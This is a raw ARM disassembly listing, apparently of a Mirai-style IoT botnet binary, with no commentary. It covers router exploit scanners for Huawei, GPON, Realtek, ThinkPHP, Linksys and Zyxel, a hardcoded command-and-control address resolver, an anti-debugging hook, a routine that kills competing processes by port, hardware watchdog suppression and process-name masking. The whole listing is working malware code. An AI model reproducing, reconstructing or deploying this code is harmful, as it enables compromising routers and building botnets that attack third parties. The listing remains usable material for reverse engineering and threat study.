   118f0:	e5863008 	str	r3, [r6, #8]
   118f4:	eaffffc7 	b	11818 <linksys_scanner_init+0x7f0>
   118f8:	03a03068 	moveq	r3, #104	; 0x68
   118fc:	058a3000 	streq	r3, [sl]
   11900:	0a000004 	beq	11918 <linksys_scanner_init+0x8f0>
   11904:	e3700001 	cmn	r0, #1
   11908:	1a000023 	bne	1199c <linksys_scanner_init+0x974>
   1190c:	e59a3000 	ldr	r3, [sl]
   11910:	e353000b 	cmp	r3, #11
   11914:	0affffc6 	beq	11834 <linksys_scanner_init+0x80c>
   11918:	e5963008 	ldr	r3, [r6, #8]
   1191c:	e3530002 	cmp	r3, #2
   11920:	1a000032 	bne	119f0 <linksys_scanner_init+0x9c8>
   11924:	e5960000 	ldr	r0, [r6]
   11928:	eb002144 	bl	19e40 <__GI___libc_close>
   1192c:	e1a00006 	mov	r0, r6
   11930:	ebfffd87 	bl	10f54 <linksys_setup_connection>
   11934:	e5963008 	ldr	r3, [r6, #8]
   11938:	e3530000 	cmp	r3, #0
   1193c:	0affffbc 	beq	11834 <linksys_scanner_init+0x80c>
   11940:	e5963014 	ldr	r3, [r6, #20]
   11944:	e3530b01 	cmp	r3, #1024	; 0x400
   11948:	12865018 	addne	r5, r6, #24
   1194c:	0a00001e 	beq	119cc <linksys_scanner_init+0x9a4>
   11950:	e3a07000 	mov	r7, #0
   11954:	e58a7000 	str	r7, [sl]
   11958:	e5962014 	ldr	r2, [r6, #20]
   1195c:	e0854002 	add	r4, r5, r2
   11960:	e5960000 	ldr	r0, [r6]
   11964:	e2622b01 	rsb	r2, r2, #1024	; 0x400
   11968:	e1a01004 	mov	r1, r4
   1196c:	e3a03901 	mov	r3, #16384	; 0x4000
   11970:	eb0014f3 	bl	16d44 <__libc_recv>
   11974:	e3500000 	cmp	r0, #0
   11978:	daffffde 	ble	118f8 <linksys_scanner_init+0x8d0>
   1197c:	e1a02007 	mov	r2, r7
   11980:	e7d23004 	ldrb	r3, [r2, r4]
   11984:	e3530000 	cmp	r3, #0
   11988:	02833041 	addeq	r3, r3, #65	; 0x41
   1198c:	07c23004 	strbeq	r3, [r2, r4]
   11990:	e2822001 	add	r2, r2, #1
   11994:	e1520000 	cmp	r2, r0
   11998:	1afffff8 	bne	11980 <linksys_scanner_init+0x958>
   1199c:	e59f1100 	ldr	r1, [pc, #256]	; 11aa4 <linksys_scanner_init+0xa7c>
   119a0:	e5963014 	ldr	r3, [r6, #20]
   119a4:	e5912000 	ldr	r2, [r1]
   119a8:	e0833000 	add	r3, r3, r0
   119ac:	e5863014 	str	r3, [r6, #20]
   119b0:	e5862004 	str	r2, [r6, #4]
   119b4:	e1a00005 	mov	r0, r5
   119b8:	eb000c5a 	bl	14b28 <util_strlen>
   119bc:	e3a03000 	mov	r3, #0
   119c0:	e0860000 	add	r0, r6, r0
   119c4:	e5c03018 	strb	r3, [r0, #24]
   119c8:	eaffffd9 	b	11934 <linksys_scanner_init+0x90c>
   119cc:	e2865018 	add	r5, r6, #24
   119d0:	e1a00005 	mov	r0, r5
   119d4:	e2861058 	add	r1, r6, #88	; 0x58
   119d8:	e3a02d0f 	mov	r2, #960	; 0x3c0
   119dc:	eb0013b7 	bl	168c0 <__GI_memmove>
   119e0:	e5963014 	ldr	r3, [r6, #20]
   119e4:	e2433040 	sub	r3, r3, #64	; 0x40
   119e8:	e5863014 	str	r3, [r6, #20]
   119ec:	eaffffd7 	b	11950 <linksys_scanner_init+0x928>
   119f0:	e5960000 	ldr	r0, [r6]
   119f4:	eb002111 	bl	19e40 <__GI___libc_close>
   119f8:	e3a03000 	mov	r3, #0
   119fc:	e3e02000 	mvn	r2, #0
   11a00:	e5863008 	str	r3, [r6, #8]
   11a04:	e5862000 	str	r2, [r6]
   11a08:	e1a00005 	mov	r0, r5
   11a0c:	e3a01b01 	mov	r1, #1024	; 0x400
   11a10:	eb000c69 	bl	14bbc <util_zero>
   11a14:	eaffff86 	b	11834 <linksys_scanner_init+0x80c>
   11a18:	e2864e41 	add	r4, r6, #1040	; 0x410
   11a1c:	e2844008 	add	r4, r4, #8
   11a20:	e59f1090 	ldr	r1, [pc, #144]	; 11ab8 <linksys_scanner_init+0xa90>
   11a24:	e1a00004 	mov	r0, r4
   11a28:	eb000c48 	bl	14b50 <util_strcpy>
   11a2c:	e1a00004 	mov	r0, r4
   11a30:	e7975008 	ldr	r5, [r7, r8]
   11a34:	eb000c3b 	bl	14b28 <util_strlen>
   11a38:	e3a03901 	mov	r3, #16384	; 0x4000
   11a3c:	e1a02000 	mov	r2, r0
   11a40:	e1a01004 	mov	r1, r4
   11a44:	e1a00005 	mov	r0, r5
   11a48:	eb00151e 	bl	16ec8 <__libc_send>
   11a4c:	e3a01e7e 	mov	r1, #2016	; 0x7e0
   11a50:	e1a00004 	mov	r0, r4
   11a54:	e2811008 	add	r1, r1, #8
   11a58:	eb000c57 	bl	14bbc <util_zero>
   11a5c:	e3a01b01 	mov	r1, #1024	; 0x400
   11a60:	e2860018 	add	r0, r6, #24
   11a64:	eb000c54 	bl	14bbc <util_zero>
   11a68:	e7970008 	ldr	r0, [r7, r8]
   11a6c:	eb0020f3 	bl	19e40 <__GI___libc_close>
   11a70:	e1a00006 	mov	r0, r6
   11a74:	ebfffd36 	bl	10f54 <linksys_setup_connection>
   11a78:	e3a03003 	mov	r3, #3
   11a7c:	e5863008 	str	r3, [r6, #8]
   11a80:	eaffff6b 	b	11834 <linksys_scanner_init+0x80c>
   11a84:	e7970008 	ldr	r0, [r7, r8]
   11a88:	eb0020ec 	bl	19e40 <__GI___libc_close>
   11a8c:	e3e03000 	mvn	r3, #0
   11a90:	e7873008 	str	r3, [r7, r8]
   11a94:	e5864008 	str	r4, [r6, #8]
   11a98:	eaffff65 	b	11834 <linksys_scanner_init+0x80c>
   11a9c:	00028cfc 	.word	0x00028cfc
   11aa0:	0002b8ac 	.word	0x0002b8ac
   11aa4:	00028d2c 	.word	0x00028d2c
   11aa8:	0002b8b0 	.word	0x0002b8b0
   11aac:	00028d00 	.word	0x00028d00
   11ab0:	00028d04 	.word	0x00028d04
   11ab4:	55555556 	.word	0x55555556
   11ab8:	0001f700 	.word	0x0001f700

00011abc <anti_gdb_entry>:
   11abc:	e59f2008 	ldr	r2, [pc, #8]	; 11acc <anti_gdb_entry+0x10>
   11ac0:	e59f3008 	ldr	r3, [pc, #8]	; 11ad0 <anti_gdb_entry+0x14>
   11ac4:	e5832000 	str	r2, [r3]
   11ac8:	e12fff1e 	bx	lr
   11acc:	00011ad4 	.word	0x00011ad4
   11ad0:	00028a70 	.word	0x00028a70

00011ad4 <resolve_cnc_addr>:
   11ad4:	e59f3014 	ldr	r3, [pc, #20]	; 11af0 <resolve_cnc_addr+0x1c>
   11ad8:	e3a02c37 	mov	r2, #14080	; 0x3700
   11adc:	e59f1010 	ldr	r1, [pc, #16]	; 11af4 <resolve_cnc_addr+0x20>
   11ae0:	e2822025 	add	r2, r2, #37	; 0x25
   11ae4:	e1c320b2 	strh	r2, [r3, #2]
   11ae8:	e5831004 	str	r1, [r3, #4]
   11aec:	e12fff1e 	bx	lr
   11af0:	0002b8bc 	.word	0x0002b8bc
   11af4:	0894ad6b 	.word	0x0894ad6b

00011af8 <ensure_single_instance>:
   11af8:	e92d41f0 	push	{r4, r5, r6, r7, r8, lr}
   11afc:	e3a04001 	mov	r4, #1
   11b00:	e24dd020 	sub	sp, sp, #32
   11b04:	e3a00002 	mov	r0, #2
   11b08:	e1a01004 	mov	r1, r4
   11b0c:	e3a02000 	mov	r2, #0
   11b10:	e58d401c 	str	r4, [sp, #28]
   11b14:	eb00154e 	bl	17054 <__GI_socket>
   11b18:	e59f612c 	ldr	r6, [pc, #300]	; 11c4c <ensure_single_instance+0x154>
   11b1c:	e3700001 	cmn	r0, #1
   11b20:	e5860000 	str	r0, [r6]
   11b24:	0a00002a 	beq	11bd4 <ensure_single_instance+0xdc>
   11b28:	e28d301c 	add	r3, sp, #28
   11b2c:	e1a01004 	mov	r1, r4
   11b30:	e3a05004 	mov	r5, #4
   11b34:	e3a02002 	mov	r2, #2
   11b38:	e58d5000 	str	r5, [sp]
   11b3c:	eb001532 	bl	1700c <__GI_setsockopt>
   11b40:	e5964000 	ldr	r4, [r6]
   11b44:	e3a01003 	mov	r1, #3
   11b48:	e3a02000 	mov	r2, #0
   11b4c:	e1a00004 	mov	r0, r4
   11b50:	eb001117 	bl	15fb4 <__GI___libc_fcntl>
   11b54:	e1a01005 	mov	r1, r5
   11b58:	e3802b02 	orr	r2, r0, #2048	; 0x800
   11b5c:	e1a00004 	mov	r0, r4
   11b60:	eb001113 	bl	15fb4 <__GI___libc_fcntl>
   11b64:	e59f80e4 	ldr	r8, [pc, #228]	; 11c50 <ensure_single_instance+0x158>
   11b68:	e5d83000 	ldrb	r3, [r8]
   11b6c:	e3530000 	cmp	r3, #0
   11b70:	059f30dc 	ldreq	r3, [pc, #220]	; 11c54 <ensure_single_instance+0x15c>
   11b74:	13a02401 	movne	r2, #16777216	; 0x1000000
   11b78:	05932000 	ldreq	r2, [r3]
   11b7c:	e3a03edb 	mov	r3, #3504	; 0xdb0
   11b80:	1282207f 	addne	r2, r2, #127	; 0x7f
   11b84:	e2833003 	add	r3, r3, #3
   11b88:	e58d2010 	str	r2, [sp, #16]
   11b8c:	e1cd30be 	strh	r3, [sp, #14]
   11b90:	eb001330 	bl	16858 <__GI___errno_location>
   11b94:	e3a07000 	mov	r7, #0
   11b98:	e5807000 	str	r7, [r0]
   11b9c:	e28d500c 	add	r5, sp, #12
   11ba0:	e3a03002 	mov	r3, #2
   11ba4:	e1a04000 	mov	r4, r0
   11ba8:	e1a01005 	mov	r1, r5
   11bac:	e5960000 	ldr	r0, [r6]
   11bb0:	e3a02010 	mov	r2, #16
   11bb4:	e1cd30bc 	strh	r3, [sp, #12]
   11bb8:	eb0013de 	bl	16b38 <__GI_bind>
   11bbc:	e3700001 	cmn	r0, #1
   11bc0:	0a000006 	beq	11be0 <ensure_single_instance+0xe8>
   11bc4:	e59f3080 	ldr	r3, [pc, #128]	; 11c4c <ensure_single_instance+0x154>
   11bc8:	e3a01001 	mov	r1, #1
   11bcc:	e5930000 	ldr	r0, [r3]
   11bd0:	eb00143a 	bl	16cc0 <__GI_listen>
   11bd4:	e28dd020 	add	sp, sp, #32
   11bd8:	e8bd41f0 	pop	{r4, r5, r6, r7, r8, lr}
   11bdc:	e12fff1e 	bx	lr
   11be0:	e5943000 	ldr	r3, [r4]
   11be4:	e3530063 	cmp	r3, #99	; 0x63
   11be8:	0a000012 	beq	11c38 <ensure_single_instance+0x140>
   11bec:	e3a03000 	mov	r3, #0
   11bf0:	e3a04edb 	mov	r4, #3504	; 0xdb0
   11bf4:	e1a01005 	mov	r1, r5
   11bf8:	e3a02010 	mov	r2, #16
   11bfc:	e2844003 	add	r4, r4, #3
   11c00:	e58d3010 	str	r3, [sp, #16]
   11c04:	e5960000 	ldr	r0, [r6]
   11c08:	e3a03002 	mov	r3, #2
   11c0c:	e1cd30bc 	strh	r3, [sp, #12]
   11c10:	e1cd40be 	strh	r4, [sp, #14]
   11c14:	eb0013e9 	bl	16bc0 <__libc_connect>
   11c18:	e3a00005 	mov	r0, #5
   11c1c:	eb002032 	bl	19cec <__GI_sleep>
   11c20:	e5960000 	ldr	r0, [r6]
   11c24:	eb002085 	bl	19e40 <__GI___libc_close>
   11c28:	e1a00004 	mov	r0, r4
   11c2c:	ebfff97e 	bl	1022c <killer_kill_by_port>
   11c30:	ebffffb0 	bl	11af8 <ensure_single_instance>
   11c34:	eaffffe6 	b	11bd4 <ensure_single_instance+0xdc>
   11c38:	e5d83000 	ldrb	r3, [r8]
   11c3c:	e1530007 	cmp	r3, r7
   11c40:	159f3008 	ldrne	r3, [pc, #8]	; 11c50 <ensure_single_instance+0x158>
   11c44:	15c37000 	strbne	r7, [r3]
   11c48:	eaffffe7 	b	11bec <ensure_single_instance+0xf4>
   11c4c:	00028a68 	.word	0x00028a68
   11c50:	00028a74 	.word	0x00028a74
   11c54:	0002b8ac 	.word	0x0002b8ac

00011c58 <watchdog_maintain>:
   11c58:	e92d4030 	push	{r4, r5, lr}
   11c5c:	e24dd00c 	sub	sp, sp, #12
   11c60:	eb001eba 	bl	19750 <__libc_fork>
   11c64:	e3700001 	cmn	r0, #1
   11c68:	13a03000 	movne	r3, #0
   11c6c:	03a03001 	moveq	r3, #1
   11c70:	e3500000 	cmp	r0, #0
   11c74:	d1a05003 	movle	r5, r3
   11c78:	c3835001 	orrgt	r5, r3, #1
   11c7c:	e59f3180 	ldr	r3, [pc, #384]	; 11e04 <watchdog_maintain+0x1ac>
   11c80:	e3550000 	cmp	r5, #0
   11c84:	e5830000 	str	r0, [r3]
   11c88:	0a000002 	beq	11c98 <watchdog_maintain+0x40>
   11c8c:	e28dd00c 	add	sp, sp, #12
   11c90:	e8bd4030 	pop	{r4, r5, lr}
   11c94:	e12fff1e 	bx	lr
   11c98:	e3a03001 	mov	r3, #1
   11c9c:	e3a0001b 	mov	r0, #27
   11ca0:	e58d3004 	str	r3, [sp, #4]
   11ca4:	eb00061d 	bl	13520 <table_unlock_val>
   11ca8:	e3a0001d 	mov	r0, #29
   11cac:	eb00061b 	bl	13520 <table_unlock_val>
   11cb0:	e3a0001e 	mov	r0, #30
   11cb4:	eb000619 	bl	13520 <table_unlock_val>
   11cb8:	e3a0001f 	mov	r0, #31
   11cbc:	eb000617 	bl	13520 <table_unlock_val>
   11cc0:	e3a00020 	mov	r0, #32
   11cc4:	eb000615 	bl	13520 <table_unlock_val>
   11cc8:	e3a00021 	mov	r0, #33	; 0x21
   11ccc:	eb000613 	bl	13520 <table_unlock_val>
   11cd0:	e1a01005 	mov	r1, r5
   11cd4:	e3a0001b 	mov	r0, #27
   11cd8:	eb0005df 	bl	1345c <table_retrieve_val>
   11cdc:	e3a01002 	mov	r1, #2
   11ce0:	eb00207a 	bl	19ed0 <__GI___libc_open>
   11ce4:	e3700001 	cmn	r0, #1
   11ce8:	e1a04000 	mov	r4, r0
   11cec:	0a00000e 	beq	11d2c <watchdog_maintain+0xd4>
   11cf0:	e3a01a45 	mov	r1, #282624	; 0x45000
   11cf4:	e2811c07 	add	r1, r1, #1792	; 0x700
   11cf8:	e2811112 	add	r1, r1, #-2147483644	; 0x80000004
   11cfc:	e1a00004 	mov	r0, r4
   11d00:	e28d2004 	add	r2, sp, #4
   11d04:	eb0010ec 	bl	160bc <__GI_ioctl>
   11d08:	e3a01a45 	mov	r1, #282624	; 0x45000
   11d0c:	e2811c07 	add	r1, r1, #1792	; 0x700
   11d10:	e2811116 	add	r1, r1, #-2147483643	; 0x80000005
   11d14:	e1a00004 	mov	r0, r4
   11d18:	e3a02000 	mov	r2, #0
   11d1c:	eb0010e6 	bl	160bc <__GI_ioctl>
   11d20:	e3a0000a 	mov	r0, #10
   11d24:	eb001ff0 	bl	19cec <__GI_sleep>
   11d28:	eafffff6 	b	11d08 <watchdog_maintain+0xb0>
   11d2c:	e1a01005 	mov	r1, r5
   11d30:	e3a0001d 	mov	r0, #29
   11d34:	eb0005c8 	bl	1345c <table_retrieve_val>
   11d38:	e3a01002 	mov	r1, #2
   11d3c:	eb002063 	bl	19ed0 <__GI___libc_open>
   11d40:	e3700001 	cmn	r0, #1
   11d44:	e1a04000 	mov	r4, r0
   11d48:	1affffe8 	bne	11cf0 <watchdog_maintain+0x98>
   11d4c:	e1a01005 	mov	r1, r5
   11d50:	e3a0001e 	mov	r0, #30
   11d54:	eb0005c0 	bl	1345c <table_retrieve_val>
   11d58:	e3a01002 	mov	r1, #2
   11d5c:	eb00205b 	bl	19ed0 <__GI___libc_open>
   11d60:	e3700001 	cmn	r0, #1
   11d64:	e1a04000 	mov	r4, r0
   11d68:	1affffe0 	bne	11cf0 <watchdog_maintain+0x98>
   11d6c:	e1a01005 	mov	r1, r5
   11d70:	e3a0001f 	mov	r0, #31
   11d74:	eb0005b8 	bl	1345c <table_retrieve_val>
   11d78:	e3a01002 	mov	r1, #2
   11d7c:	eb002053 	bl	19ed0 <__GI___libc_open>
   11d80:	e3700001 	cmn	r0, #1
   11d84:	e1a04000 	mov	r4, r0
   11d88:	1affffd8 	bne	11cf0 <watchdog_maintain+0x98>
   11d8c:	e1a01005 	mov	r1, r5
   11d90:	e3a00020 	mov	r0, #32
   11d94:	eb0005b0 	bl	1345c <table_retrieve_val>
   11d98:	e3a01002 	mov	r1, #2
   11d9c:	eb00204b 	bl	19ed0 <__GI___libc_open>
   11da0:	e3700001 	cmn	r0, #1
   11da4:	e1a04000 	mov	r4, r0
   11da8:	1affffd0 	bne	11cf0 <watchdog_maintain+0x98>
   11dac:	e1a01005 	mov	r1, r5
   11db0:	e3a00021 	mov	r0, #33	; 0x21
   11db4:	eb0005a8 	bl	1345c <table_retrieve_val>
   11db8:	e3a01002 	mov	r1, #2
   11dbc:	eb002043 	bl	19ed0 <__GI___libc_open>
   11dc0:	e3700001 	cmn	r0, #1
   11dc4:	e1a04000 	mov	r4, r0
   11dc8:	1affffc8 	bne	11cf0 <watchdog_maintain+0x98>
   11dcc:	e3a0001b 	mov	r0, #27
   11dd0:	eb0005aa 	bl	13480 <table_lock_val>
   11dd4:	e3a0001d 	mov	r0, #29
   11dd8:	eb0005a8 	bl	13480 <table_lock_val>
   11ddc:	e3a0001e 	mov	r0, #30
   11de0:	eb0005a6 	bl	13480 <table_lock_val>
   11de4:	e3a0001f 	mov	r0, #31
   11de8:	eb0005a4 	bl	13480 <table_lock_val>
   11dec:	e3a00020 	mov	r0, #32
   11df0:	eb0005a2 	bl	13480 <table_lock_val>
   11df4:	e3a00021 	mov	r0, #33	; 0x21
   11df8:	eb0005a0 	bl	13480 <table_lock_val>
   11dfc:	e1a00005 	mov	r0, r5
   11e00:	eb001c45 	bl	18f1c <__GI_exit>
   11e04:	00028d30 	.word	0x00028d30

00011e08 <main>:
   11e08:	e92d4ff0 	push	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
   11e0c:	e24ddd16 	sub	sp, sp, #1408	; 0x580
   11e10:	e24dd004 	sub	sp, sp, #4
   11e14:	e28d4e56 	add	r4, sp, #1376	; 0x560
   11e18:	e2844008 	add	r4, r4, #8
   11e1c:	e3a05000 	mov	r5, #0
   11e20:	e1a06000 	mov	r6, r0
   11e24:	e1a00004 	mov	r0, r4
   11e28:	e1a08001 	mov	r8, r1
   11e2c:	e58d5578 	str	r5, [sp, #1400]	; 0x578
   11e30:	eb0014ac 	bl	170e8 <__GI_sigemptyset>
   11e34:	e3a01002 	mov	r1, #2
   11e38:	e1a00004 	mov	r0, r4
   11e3c:	eb001495 	bl	17098 <__GI_sigaddset>
   11e40:	e1a02005 	mov	r2, r5
   11e44:	e1a01004 	mov	r1, r4
   11e48:	e1a00005 	mov	r0, r5
   11e4c:	eb001143 	bl	16360 <__GI_sigprocmask>
   11e50:	e3a01001 	mov	r1, #1
   11e54:	e3a00011 	mov	r0, #17
   11e58:	eb0014a7 	bl	170fc <__GI_signal>
   11e5c:	e59f175c 	ldr	r1, [pc, #1884]	; 125c0 <main+0x7b8>
   11e60:	e3a00005 	mov	r0, #5
   11e64:	eb0014a4 	bl	170fc <__GI_signal>
   11e68:	eb000bdd 	bl	14de4 <util_local_addr>
   11e6c:	e59f2750 	ldr	r2, [pc, #1872]	; 125c4 <main+0x7bc>
   11e70:	e3e03db7 	mvn	r3, #11712	; 0x2dc0
   11e74:	e243303b 	sub	r3, r3, #59	; 0x3b
   11e78:	e1c230b2 	strh	r3, [r2, #2]
   11e7c:	e59f3744 	ldr	r3, [pc, #1860]	; 125c8 <main+0x7c0>
   11e80:	e59f1744 	ldr	r1, [pc, #1860]	; 125cc <main+0x7c4>
   11e84:	e5823004 	str	r3, [r2, #4]
   11e88:	e3a03002 	mov	r3, #2
   11e8c:	e5810000 	str	r0, [r1]
   11e90:	e1c230b0 	strh	r3, [r2]
   11e94:	eb0005c9 	bl	135c0 <table_init>
   11e98:	e59f3730 	ldr	r3, [pc, #1840]	; 125d0 <main+0x7c8>
   11e9c:	e59fc730 	ldr	ip, [pc, #1840]	; 125d4 <main+0x7cc>
   11ea0:	e28d9e51 	add	r9, sp, #1296	; 0x510
   11ea4:	e58c3000 	str	r3, [ip]
   11ea8:	ebffff12 	bl	11af8 <ensure_single_instance>
   11eac:	eb0001e8 	bl	12654 <rand_init>
   11eb0:	e1a00009 	mov	r0, r9
   11eb4:	e3a01020 	mov	r1, #32
   11eb8:	eb000b3f 	bl	14bbc <util_zero>
   11ebc:	e3560002 	cmp	r6, #2
   11ec0:	0a000046 	beq	11fe0 <main+0x1d8>
   11ec4:	eb0001cb 	bl	125f8 <rand_next>
   11ec8:	e1a06000 	mov	r6, r0
   11ecc:	e5980000 	ldr	r0, [r8]
   11ed0:	eb000b14 	bl	14b28 <util_strlen>
   11ed4:	e1a05000 	mov	r5, r0
   11ed8:	e5980000 	ldr	r0, [r8]
   11edc:	eb000b11 	bl	14b28 <util_strlen>
   11ee0:	e2651014 	rsb	r1, r5, #20
   11ee4:	e1a04000 	mov	r4, r0
   11ee8:	e1a00006 	mov	r0, r6
   11eec:	eb000fae 	bl	15dac <__aeabi_uidivmod>
   11ef0:	e28d5e53 	add	r5, sp, #1328	; 0x530
   11ef4:	e0844001 	add	r4, r4, r1
   11ef8:	e1a01004 	mov	r1, r4
   11efc:	e1a00005 	mov	r0, r5
   11f00:	eb0001ed 	bl	126bc <rand_alpha_str>
   11f04:	e28ded16 	add	lr, sp, #1408	; 0x580
   11f08:	e08e3004 	add	r3, lr, r4
   11f0c:	e3a0a000 	mov	sl, #0
   11f10:	e1a01005 	mov	r1, r5
   11f14:	e5980000 	ldr	r0, [r8]
   11f18:	e543a050 	strb	sl, [r3, #-80]	; 0xffffffb0
   11f1c:	eb000b0b 	bl	14b50 <util_strcpy>
   11f20:	e3a01020 	mov	r1, #32
   11f24:	e1a00005 	mov	r0, r5
   11f28:	eb000b23 	bl	14bbc <util_zero>
   11f2c:	eb0001b1 	bl	125f8 <rand_next>
   11f30:	e1a07000 	mov	r7, r0
   11f34:	e5980000 	ldr	r0, [r8]
   11f38:	eb000afa 	bl	14b28 <util_strlen>
   11f3c:	e1a06000 	mov	r6, r0
   11f40:	e5980000 	ldr	r0, [r8]
   11f44:	eb000af7 	bl	14b28 <util_strlen>
   11f48:	e2661014 	rsb	r1, r6, #20
   11f4c:	e1a04000 	mov	r4, r0
   11f50:	e1a00007 	mov	r0, r7
   11f54:	eb000f94 	bl	15dac <__aeabi_uidivmod>
   11f58:	e0844001 	add	r4, r4, r1
   11f5c:	e1a00005 	mov	r0, r5
   11f60:	e1a01004 	mov	r1, r4
   11f64:	eb0001d4 	bl	126bc <rand_alpha_str>
   11f68:	e28d2d16 	add	r2, sp, #1408	; 0x580
   11f6c:	e0823004 	add	r3, r2, r4
   11f70:	e543a050 	strb	sl, [r3, #-80]	; 0xffffffb0
   11f74:	e1a01005 	mov	r1, r5
   11f78:	e3a0000f 	mov	r0, #15
   11f7c:	eb001094 	bl	161d4 <prctl>
   11f80:	e3a00004 	mov	r0, #4
   11f84:	eb000565 	bl	13520 <table_unlock_val>
   11f88:	e28d1e57 	add	r1, sp, #1392	; 0x570
   11f8c:	e2811008 	add	r1, r1, #8
   11f90:	e3a00004 	mov	r0, #4
   11f94:	eb000530 	bl	1345c <table_retrieve_val>
   11f98:	e59d2578 	ldr	r2, [sp, #1400]	; 0x578
   11f9c:	e1a01000 	mov	r1, r0
   11fa0:	e3a00001 	mov	r0, #1
   11fa4:	eb001fed 	bl	19f60 <__GI___libc_write>
   11fa8:	e3a00001 	mov	r0, #1
   11fac:	e59f1624 	ldr	r1, [pc, #1572]	; 125d8 <main+0x7d0>
   11fb0:	e1a02000 	mov	r2, r0
   11fb4:	eb001fe9 	bl	19f60 <__GI___libc_write>
   11fb8:	e3a00004 	mov	r0, #4
   11fbc:	eb00052f 	bl	13480 <table_lock_val>
   11fc0:	eb001de2 	bl	19750 <__libc_fork>
   11fc4:	e150000a 	cmp	r0, sl
   11fc8:	da000012 	ble	12018 <main+0x210>
   11fcc:	e1a0000a 	mov	r0, sl
   11fd0:	e28ddf61 	add	sp, sp, #388	; 0x184
   11fd4:	e28ddb01 	add	sp, sp, #1024	; 0x400
   11fd8:	e8bd4ff0 	pop	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
   11fdc:	e12fff1e 	bx	lr
   11fe0:	e5980004 	ldr	r0, [r8, #4]
   11fe4:	eb000acf 	bl	14b28 <util_strlen>
   11fe8:	e350001f 	cmp	r0, #31
   11fec:	caffffb4 	bgt	11ec4 <main+0xbc>
   11ff0:	e5981004 	ldr	r1, [r8, #4]
   11ff4:	e1a00009 	mov	r0, r9
   11ff8:	eb000ad4 	bl	14b50 <util_strcpy>
   11ffc:	e5984004 	ldr	r4, [r8, #4]
   12000:	e1a00004 	mov	r0, r4
   12004:	eb000ac7 	bl	14b28 <util_strlen>
   12008:	e1a01000 	mov	r1, r0
   1200c:	e1a00004 	mov	r0, r4
   12010:	eb000ae9 	bl	14bbc <util_zero>
   12014:	eaffffaa 	b	11ec4 <main+0xbc>
   12018:	eb0010c0 	bl	16320 <__GI_setsid>
   1201c:	e58d0008 	str	r0, [sp, #8]
   12020:	e1a0000a 	mov	r0, sl
   12024:	eb001f85 	bl	19e40 <__GI___libc_close>
   12028:	e3a00001 	mov	r0, #1
   1202c:	eb001f83 	bl	19e40 <__GI___libc_close>
   12030:	e3a00002 	mov	r0, #2
   12034:	eb001f81 	bl	19e40 <__GI___libc_close>
   12038:	e59fb59c 	ldr	fp, [pc, #1436]	; 125dc <main+0x7d4>
   1203c:	ebffe0db 	bl	a3b0 <attack_init>
   12040:	ebffff04 	bl	11c58 <watchdog_maintain>
   12044:	ebfff5b5 	bl	f720 <huawei_init>
   12048:	ebfff285 	bl	ea64 <gpon443_scanner>
   1204c:	eb000244 	bl	12964 <realtekscanner_scanner_init>
   12050:	eb0007f6 	bl	14030 <thinkphp_scanner>
   12054:	ebfffbf3 	bl	11028 <linksys_scanner_init>
   12058:	eb000c6c 	bl	15210 <zyxelscanner_scanner_init>
   1205c:	ebfff9d7 	bl	107c0 <killer_init>
   12060:	e58da00c 	str	sl, [sp, #12]
   12064:	e28d6e49 	add	r6, sp, #1168	; 0x490
   12068:	e28d7e41 	add	r7, sp, #1040	; 0x410
   1206c:	e3a03000 	mov	r3, #0
   12070:	e58d3490 	str	r3, [sp, #1168]	; 0x490
   12074:	e2833004 	add	r3, r3, #4
   12078:	e3a02000 	mov	r2, #0
   1207c:	e7832006 	str	r2, [r3, r6]
   12080:	e2833004 	add	r3, r3, #4
   12084:	e3530080 	cmp	r3, #128	; 0x80
   12088:	1afffffa 	bne	12078 <main+0x270>
   1208c:	e58d2410 	str	r2, [sp, #1040]	; 0x410
   12090:	e243307c 	sub	r3, r3, #124	; 0x7c
   12094:	e3a04000 	mov	r4, #0
   12098:	e7834007 	str	r4, [r3, r7]
   1209c:	e2833004 	add	r3, r3, #4
   120a0:	e3530080 	cmp	r3, #128	; 0x80
   120a4:	1afffffa 	bne	12094 <main+0x28c>
   120a8:	e59f3530 	ldr	r3, [pc, #1328]	; 125e0 <main+0x7d8>
   120ac:	e5930000 	ldr	r0, [r3]
   120b0:	e3700001 	cmn	r0, #1
   120b4:	0a000008 	beq	120dc <main+0x2d4>
   120b8:	e1a032a0 	lsr	r3, r0, #5
   120bc:	e1a03103 	lsl	r3, r3, #2
   120c0:	e28dcd16 	add	ip, sp, #1408	; 0x580
   120c4:	e083300c 	add	r3, r3, ip
   120c8:	e51320f0 	ldr	r2, [r3, #-240]	; 0xffffff10
   120cc:	e200001f 	and	r0, r0, #31
   120d0:	e3a01001 	mov	r1, #1
   120d4:	e1822011 	orr	r2, r2, r1, lsl r0
   120d8:	e50320f0 	str	r2, [r3, #-240]	; 0xffffff10
   120dc:	e59b3000 	ldr	r3, [fp]
   120e0:	e3730001 	cmn	r3, #1
   120e4:	e59f84f0 	ldr	r8, [pc, #1264]	; 125dc <main+0x7d4>
   120e8:	0a000085 	beq	12304 <main+0x4fc>
   120ec:	e59fe4f0 	ldr	lr, [pc, #1264]	; 125e4 <main+0x7dc>
   120f0:	e5de3000 	ldrb	r3, [lr]
   120f4:	e3530000 	cmp	r3, #0
   120f8:	0a000050 	beq	12240 <main+0x438>
   120fc:	e59bc000 	ldr	ip, [fp]
   12100:	e1a032ac 	lsr	r3, ip, #5
   12104:	e28d1d16 	add	r1, sp, #1408	; 0x580
   12108:	e1a03103 	lsl	r3, r3, #2
   1210c:	e0833001 	add	r3, r3, r1
   12110:	e5132170 	ldr	r2, [r3, #-368]	; 0xfffffe90
   12114:	e20c001f 	and	r0, ip, #31
   12118:	e3a01001 	mov	r1, #1
   1211c:	e1822011 	orr	r2, r2, r1, lsl r0
   12120:	e5032170 	str	r2, [r3, #-368]	; 0xfffffe90
   12124:	e59f34b4 	ldr	r3, [pc, #1204]	; 125e0 <main+0x7d8>
   12128:	e5930000 	ldr	r0, [r3]
   1212c:	e3a0e000 	mov	lr, #0
   12130:	e15c0000 	cmp	ip, r0
   12134:	a1a0000c 	movge	r0, ip
   12138:	b1a00000 	movlt	r0, r0
   1213c:	e3a0c00a 	mov	ip, #10
   12140:	e58dc560 	str	ip, [sp, #1376]	; 0x560
   12144:	e2800001 	add	r0, r0, #1
   12148:	e28dce56 	add	ip, sp, #1376	; 0x560
   1214c:	e1a0300e 	mov	r3, lr
   12150:	e1a01006 	mov	r1, r6
   12154:	e1a02007 	mov	r2, r7
   12158:	e58de564 	str	lr, [sp, #1380]	; 0x564
   1215c:	e58dc000 	str	ip, [sp]
   12160:	eb00104d 	bl	1629c <__libc_select>
